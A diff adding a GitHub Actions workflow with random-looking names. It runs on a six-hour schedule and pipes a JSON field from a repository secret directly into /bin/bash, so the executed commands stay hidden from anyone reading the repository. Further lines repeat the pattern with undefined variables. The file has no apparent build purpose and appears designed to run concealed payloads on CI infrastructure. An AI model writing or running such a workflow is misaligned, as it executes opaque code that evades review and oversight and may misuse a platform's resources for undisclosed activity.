@@ -1,0 +1,20 @@
+name: liyueqing1829
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: liyueqing1829
+        env:
+          dggt176: ${{ secrets.dggt176 }}
+        run: |
+          echo $dggt176 | jq -r .mhgbv8 | /bin/bash
+          echo $fqo20 | jq -r .j73 | /bin/bash
+          echo $vxh81414 | jq -r .ui95589 | /bin/bash
+          echo $mqs55 | jq -r .em6266 | /bin/bash
+
